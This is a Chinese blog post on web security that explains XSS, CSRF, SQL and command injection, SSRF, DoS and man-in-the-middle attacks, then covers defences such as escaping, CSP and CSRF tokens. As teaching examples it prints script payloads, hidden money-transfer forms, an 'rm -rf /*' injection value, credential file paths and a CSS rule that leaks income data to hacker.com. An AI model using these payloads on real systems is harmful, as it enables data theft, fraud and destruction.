@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.sonui.cn","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="攻击篇XSS(跨站脚本攻击)原理开发者盲目信息用户传递的信息而不做处理 当用户输入时，开发者盲目的把用户输入的信息传递给服务器，服务器把用户输入的信息转换成HTML标签，然后把转换后的HTML标签传递给用户 特点 难以感知 没有UI呈现 窃取用户信息(cookies &#x2F; token) 绘制 UI (例如弹窗), 诱使用户填写私密信息  案例存储型XSSI(Stored XSS) 恶意脚本">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web 开发的安全之旅">
+<meta property="og:url" content="https://blog.sonui.cn/Journey-to-Web-Development-Security/index.html">
+<meta property="og:site_name" content="Sonui&#39;s Blog">
+<meta property="og:description" content="攻击篇XSS(跨站脚本攻击)原理开发者盲目信息用户传递的信息而不做处理 当用户输入时，开发者盲目的把用户输入的信息传递给服务器，服务器把用户输入的信息转换成HTML标签，然后把转换后的HTML标签传递给用户 特点 难以感知 没有UI呈现 窃取用户信息(cookies &#x2F; token) 绘制 UI (例如弹窗), 诱使用户填写私密信息  案例存储型XSSI(Stored XSS) 恶意脚本">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.sonui.cn/Journey-to-Web-Development-Security/9ab53341a3324607ab5bcda094d76e79~tplv-k3u1fbpfcp-watermark.png">
+<meta property="og:image" content="https://blog.sonui.cn/Journey-to-Web-Development-Security/04975e27e5d84a02be6baf32b6367285~tplv-k3u1fbpfcp-watermark.png">
+<meta property="article:published_time" content="2022-08-01T15:14:00.000Z">
+<meta property="article:modified_time" content="2024-04-03T12:23:09.553Z">
+<meta property="article:author" content="Sonui">
+<meta property="article:tag" content="web, security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.sonui.cn/Journey-to-Web-Development-Security/9ab53341a3324607ab5bcda094d76e79~tplv-k3u1fbpfcp-watermark.png">
+
+<link rel="canonical" href="https://blog.sonui.cn/Journey-to-Web-Development-Security/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Web 开发的安全之旅 | Sonui's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Sonui's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.sonui.cn/Journey-to-Web-Development-Security/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Sonui">
+      <meta itemprop="description" content="Sonui's Blog">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sonui's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Web 开发的安全之旅
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-08-01 23:14:00" itemprop="dateCreated datePublished" datetime="2022-08-01T23:14:00+08:00">2022-08-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-04-03 20:23:09" itemprop="dateModified" datetime="2024-04-03T20:23:09+08:00">2024-04-03</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="攻击篇"><a href="#攻击篇" class="headerlink" title="攻击篇"></a>攻击篇</h2><h3 id="XSS-跨站脚本攻击"><a href="#XSS-跨站脚本攻击" class="headerlink" title="XSS(跨站脚本攻击)"></a>XSS(跨站脚本攻击)</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>开发者盲目信息用户传递的信息而不做处理</p>
+<p>当用户输入时，开发者盲目的把用户输入的信息传递给服务器，服务器把用户输入的信息转换成HTML标签，然后把转换后的HTML标签传递给用户</p>
+<h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul>
+<li>难以感知 没有UI呈现</li>
+<li>窃取用户信息(cookies &#x2F; token)</li>
+<li>绘制 UI (例如弹窗), 诱使用户填写私密信息</li>
+</ul>
+<h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><h5 id="存储型XSSI-Stored-XSS"><a href="#存储型XSSI-Stored-XSS" class="headerlink" title="存储型XSSI(Stored XSS)"></a>存储型XSSI(Stored XSS)</h5><ul>
+<li>恶意脚本被存储在数据库中</li>
+<li>访问页面 -&gt; 读数据 &#x3D; 执行恶意脚本被攻击</li>
+<li><strong>危害性极大, 可对所有访问这个页面的用户进行攻击</strong></li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">async</span> <span class="title function_">submit</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; content, id &#125; = ctx.<span class="property">request</span>.<span class="property">body</span>; <span class="comment">// 没有对content 过滤</span></span><br><span class="line">    <span class="keyword">await</span> db.<span class="title function_">save</span>(&#123;</span><br><span class="line">        content,</span><br><span class="line">        id</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">public <span class="keyword">async</span> <span class="title function_">render</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; content &#125; = <span class="keyword">await</span> db.<span class="title function_">query</span>(&#123;</span><br><span class="line">        <span class="attr">id</span>: ctx.<span class="property">query</span>.<span class="property">id</span></span><br><span class="line">    &#125;);</span><br><span class="line"><span class="comment">// 没有对content 过滤</span></span><br><span class="line">ctx.<span class="property">body</span> = <span class="string">`&lt;div&gt;<span class="subst">$&#123;content&#125;</span>&lt;/div&gt;`</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当有用户恶意提交 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 时，浏览者访问页面会读取到 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，并且会执行 <code>alert(1)</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 正常 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- xss攻击 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h5 id="反射型XSS-Reflected-XSS"><a href="#反射型XSS-Reflected-XSS" class="headerlink" title="反射型XSS(Reflected XSS)"></a>反射型XSS(Reflected XSS)</h5><ul>
+<li>不涉及数据库</li>
+<li>从 URL 上攻击</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">async</span> <span class="title function_">render</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; content &#125; = ctx.<span class="property">query</span>; <span class="comment">// 没有对content 过滤</span></span><br><span class="line">    ctx.<span class="property">body</span> = <span class="string">`&lt;div&gt;<span class="subst">$&#123;content&#125;</span>&lt;/div&gt;`</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当用户访问 <code>http://localhost:3000/?content=&lt;script&gt;alert(1)&lt;/script&gt;</code> 时，页面会生成 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，用户访问后执行 <code>alert(1)</code></p>
+<h5 id="DOM-based-XSS"><a href="#DOM-based-XSS" class="headerlink" title="DOM-based XSS"></a>DOM-based XSS</h5><p>完全不需要服务器参与</p>
+<p>恶意攻击的发起 + 执行都在浏览器完成</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> content = <span class="keyword">new</span> <span class="title function_">URL</span>(location.<span class="property">href</span>).<span class="property">searchParams</span>.<span class="title function_">get</span>(<span class="string">&#x27;content&#x27;</span>); <span class="comment">// 没有对content 过滤</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>).<span class="property">innerHTML</span> = content;</span><br></pre></td></tr></table></figure>
+
+<p>当用户访问<code>http://localhost:3000/?content=&lt;script&gt;alert(1)&lt;/script&gt;</code> 时，界面读取URL参数时会读取到 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 插入到页面中发从而执行恶意脚本</p>
+<h5 id="Mutation-based-XSS"><a href="#Mutation-based-XSS" class="headerlink" title="Mutation-based XSS"></a>Mutation-based XSS</h5><ul>
+<li>利用了浏览器渲染DOM的特性</li>
+<li>不同的浏览器会有不同的实现，按浏览器进行攻击</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- XSS检查器: 无问题 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">title</span>=<span class="string">&quot;&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 渲染后 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">title</span>=<span class="string">&quot;&lt;/noscript&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">    &lt;img src=&quot;</span><span class="attr">x</span>&quot; <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line">    &quot;&quot;&gt;&quot;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Cross-site-request-forgery-CSRF"><a href="#Cross-site-request-forgery-CSRF" class="headerlink" title="Cross-site request forgery(CSRF)"></a>Cross-site request forgery(CSRF)</h3><ul>
+<li>在用户不知情的前提下</li>
+<li>利用用户权限(Cookies)</li>
+<li>构造指定HTTP请求，窃取或修改用户敏感信息</li>
+</ul>
+<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><img src="/Journey-to-Web-Development-Security/9ab53341a3324607ab5bcda094d76e79~tplv-k3u1fbpfcp-watermark.png" class="">
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 用户点击 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 点击后向黑客转账100元 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://bank.com/transfer?to=hacker&amp;amount=100&quot;</span>&gt;</span> 点我抽奖 <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 用户访问后执行 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 加载图片时向黑客转账100元 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://bank.com/transfer?to=hacker&amp;amount=100&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 表单 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 表单隐藏用户无法发现 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://bank.com/transfer&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;to&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;100&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><h4 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h4><img src="/Journey-to-Web-Development-Security/04975e27e5d84a02be6baf32b6367285~tplv-k3u1fbpfcp-watermark.png" class="">
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">async</span> <span class="title function_">renderForm</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; username, form_id &#125; = ctx.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">const</span> sql = <span class="string">`SELECT * FROM users WHERE username=&#x27;<span class="subst">$&#123;username&#125;</span>&#x27;</span></span><br><span class="line"><span class="string">    AND form_id=&#x27;<span class="subst">$&#123;form_id&#125;</span>&#x27;`</span>;</span><br><span class="line">    <span class="keyword">const</span> users = <span class="keyword">await</span> db.<span class="title function_">query</span>(sql);</span><br><span class="line">    ctx.<span class="property">body</span> = users;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当用户输入用户名为 <code>any; DROP TABLE table</code> 时，数据库会执行 <code>SELECT * FROM users WHERE username=&#39; any; DROP TABLE table&#39;</code>，从而造成删库</p>
+<h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><ul>
+<li>CLI</li>
+<li>OS command</li>
+<li>Server-side Request Forgery(SSRF), 服务端伪造请求 (严格意义上非注入，但原理类似)</li>
+</ul>
+<h5 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用于转换视频</span></span><br><span class="line">public <span class="keyword">async</span> <span class="title function_">convertVideo</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; video, options &#125; = ctx.<span class="property">query</span>;</span><br><span class="line">    <span class="title function_">exec</span>(<span class="string">`convert-cli <span class="subst">$&#123;video&#125;</span> <span class="subst">$&#123;options&#125;</span>`</span>);</span><br><span class="line">    ctx.<span class="property">body</span> = <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当用户请求参数为 <code>http://localhost:3000/?video=video.mp4&amp;options=&amp;&amp; rm -rf /*</code> 时，会执行 <code>convert-cli video.mp4 &amp;&amp; rm -rf /*</code> 从而造成服务器上的文件被删除</p>
+<h5 id="读取修改"><a href="#读取修改" class="headerlink" title="读取修改"></a>读取修改</h5><p>重要文件被暴露</p>
+<ul>
+<li>&#x2F;etc&#x2F;passwd</li>
+<li>&#x2F;etc&#x2F;shadow</li>
+<li>~&#x2F;.ssh</li>
+<li>&#x2F;etc&#x2F;apache2&#x2F;httpd.conf</li>
+<li>&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</li>
+<li>其它私密文件…</li>
+</ul>
+<p>假如黑客可以修改nginx.conf文件，添加一个反向代理</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://localhost:3000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>黑客将我们网站的访问流量转发到其竞争对手，从而造成竞争对手服务器流量过大而宕机</p>
+<h5 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">async</span> <span class="title function_">webhook</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">    <span class="comment">// callback 可能是内网 URL</span></span><br><span class="line">    <span class="comment">// e.g http://secret.com/get_employ_payrolls</span></span><br><span class="line">    ctx.<span class="property">body</span> = <span class="keyword">await</span> <span class="title function_">fetch</span>(ctx.<span class="property">query</span>.<span class="property">callback</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="DoS"><a href="#DoS" class="headerlink" title="DoS"></a>DoS</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>通过构造某种特殊的请求，导致服务器资源被显著消耗，来不及响应更多请求，导致请求积压，进而造成雪崩效应</p>
+<h4 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h4><p>知识补充</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> greedyRegExp = <span class="regexp">/a+/</span>  <span class="comment">// 有多少匹配多少</span></span><br><span class="line"><span class="keyword">const</span> nonGreedyRegExp = <span class="regexp">/a+?/</span>  <span class="comment">// 有一个就行</span></span><br><span class="line"><span class="keyword">const</span> str = <span class="string">&quot;aaaaaaaaaaaa&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">match</span>(greedyRegExp)[<span class="number">0</span>])</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">match</span>(nonGreedyRegExp)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
+
+<p>有以下正则表达式<br><code>^((ab)*)+$</code></p>
+<p>执行过程中存在的问题</p>
+
+
+<p>大量的回溯会造成响应时间大大加长，接口吞吐量也会随之下降</p>
+<p>需要注意的地方</p>
+<ul>
+<li>耗时的同步操作</li>
+<li>数据库写入</li>
+<li>SQL join</li>
+<li>文件备份</li>
+<li>循环执行逻辑</li>
+</ul>
+<h3 id="DDoS"><a href="#DDoS" class="headerlink" title="DDoS"></a>DDoS</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>短时间内发送大量重复请求，造成服务器处理堵塞请求堆积，导致服务器雪崩从而无法响应新请求</p>
+<p>特点：量大、攻击手段简单、破坏性严重</p>
+<h4 id="案例-2"><a href="#案例-2" class="headerlink" title="案例"></a>案例</h4><p>攻击者修改TCP发送大量SYN包，但不响应服务器ACK + SYN包，导致服务器无法释放连接从而堵塞</p>
+
+
+<h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>环境</p>
+<ul>
+<li>明文传输</li>
+<li>信息纂改不可知</li>
+<li>对方身份未验证</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">A[客户端]</span><br><span class="line">B[中间人]</span><br><span class="line">C[服务器]</span><br><span class="line">A--&gt;B;</span><br><span class="line">B--&gt;C;</span><br><span class="line">C--&gt;B;</span><br><span class="line">B--&gt;A;</span><br></pre></td></tr></table></figure>
+
+<p>在这个图里，中间人窃取或纂改客户端与服务端交互的信息，从而导致信息泄露</p>
+<h2 id="防御篇"><a href="#防御篇" class="headerlink" title="防御篇"></a>防御篇</h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>守则</p>
+<ul>
+<li>永不信任外部传入数据</li>
+<li>不要将用户提交内容直接转换为DOM</li>
+</ul>
+<p>工具</p>
+<ul>
+<li>主流框架默认防御XSS</li>
+<li>Google-closure-library</li>
+<li>DOMPurify</li>
+</ul>
+<h4 id="无法避免动态生成DOM"><a href="#无法避免动态生成DOM" class="headerlink" title="无法避免动态生成DOM"></a>无法避免动态生成DOM</h4><p>当存在需求无法避免动态生成DOM时，注意以下几点</p>
+<h5 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h5><p>对字符进行转义</p>
+<h5 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h5><p>允许上传图片时也要注意对SVG进行扫描</p>
+<h5 id="自定义跳转连接"><a href="#自定义跳转连接" class="headerlink" title="自定义跳转连接"></a>自定义跳转连接</h5><p>当允许用户自定义跳转连接时，需要对跳转连接进行过滤防范，例如<code>&lt;a herf=&quot;javascript:alert(0)&quot;&gt;</code> 存在危险</p>
+<h5 id="自定义样式"><a href="#自定义样式" class="headerlink" title="自定义样式"></a>自定义样式</h5><p>当有表单radio被点击时触发get请求, 暴露收入情况</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[type=radio]</span><span class="selector-class">.income-ge10k</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">&quot;http://hacker.com/?income=gt10k&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><h4 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h4><p>当满足以下条件时，浏览器认为同源，否则跨域</p>
+<ul>
+<li>协议相同</li>
+<li>域名相同</li>
+<li>端口相同</li>
+</ul>
+<p>如果发生跨域，看服务器是否支持CORS</p>
+<h4 id="Content-Security-Policy-CSP"><a href="#Content-Security-Policy-CSP" class="headerlink" title="Content Security Policy(CSP)"></a>Content Security Policy(CSP)</h4><p>内容安全策略定义哪些源或域名是安全的，来自安全源的脚本可以执行，否则报错</p>
+<p>对eval + inline scipt 说不</p>
+<h5 id="服务器端设置"><a href="#服务器端设置" class="headerlink" title="服务器端设置"></a>服务器端设置</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#x27;self&#x27; 同源允许</span><br><span class="line">Content-Security-Policy: script-src &#x27;self&#x27; https://domain.com 在同源之外允许该域脚本执行</span><br></pre></td></tr></table></figure>
+
+<h5 id="前端设置"><a href="#前端设置" class="headerlink" title="前端设置"></a>前端设置</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#x27;self&#x27;&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#x27;self&#x27; https://domain.com&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><h5 id="检查请求头部"><a href="#检查请求头部" class="headerlink" title="检查请求头部"></a>检查请求头部</h5><p>当伪造请求为异常来源时，就限制请求</p>
+<p>在同源请求中，GET和HEAD不发送Origin头部，POST发送Origin头部</p>
+<p>不论什么请求都带有Referer头部</p>
+<h5 id="token"><a href="#token" class="headerlink" title="token"></a>token</h5><p>思路：先有页面，后有请求</p>
+<ul>
+<li>在页面中生成一个token，每次请求都带上这个token</li>
+<li>在请求中检查token，如果不一致，则拒绝请求</li>
+</ul>
